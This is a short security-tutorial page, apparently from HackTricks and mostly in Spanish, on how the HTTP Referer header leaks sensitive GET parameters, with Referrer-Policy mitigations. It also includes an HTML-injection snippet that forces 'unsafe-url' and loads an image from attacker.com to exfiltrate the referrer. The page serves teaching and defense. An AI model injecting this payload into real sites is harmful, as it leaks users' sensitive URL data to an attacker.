# Interesting HTTP

{{#include ../banners/hacktricks-training.md}}

## Headers y policy de Referrer

Referrer es el header utilizado por los navegadores para indicar cuál fue la página visitada anteriormente.

### Sensitive information leaked

Si en algún momento dentro de una página web se encuentra cualquier información sensible en los parámetros de una solicitud GET, si la página contiene links a fuentes externas o un atacante puede lograr/sugerir (mediante social engineering) que el usuario visite una URL controlada por el atacante, podría ser posible exfiltrar la información sensible incluida en la última solicitud GET.

### Mitigation

Puedes hacer que el navegador siga una **Referrer-policy** que podría **evitar** que la información sensible se envíe a otras aplicaciones web:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Contramedida

Puedes anular esta regla usando una etiqueta meta de HTML (el atacante necesita explotar una inyección de HTML):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Defensa

Nunca pongas datos confidenciales dentro de los parámetros GET ni de las rutas de la URL.

{{#include ../banners/hacktricks-training.md}}
